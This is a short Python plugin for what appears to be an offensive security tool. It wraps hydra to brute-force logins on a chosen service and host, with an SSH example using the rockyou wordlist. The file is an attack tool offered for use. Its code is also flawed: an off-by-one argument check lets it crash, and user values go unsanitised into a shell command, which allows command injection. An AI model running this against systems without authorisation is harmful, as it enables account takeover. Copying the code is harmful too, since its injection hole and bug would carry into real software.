from kytin.commands.base import Command
from kytin.core.executor import exec_command
from rich import print


class Brute(Command):
    name = "brute"
    description = "Quick brute force attack"

    def run(self, cmd, context):
        parts = cmd.split()

        if len(parts) < 4:
            print("[!] Usage: brute <service> <target> <user> <passlist>")
            print("Example: brute ssh 192.168.1.1 admin rockyou.txt")
            return

        service = parts[1]
        target = parts[2]
        user = parts[3]
        passlist = parts[4]

        exec_command(
            f"hydra -l {user} -P {passlist} {service}://{target}",
            message=f"Brute forcing {service}..."
        )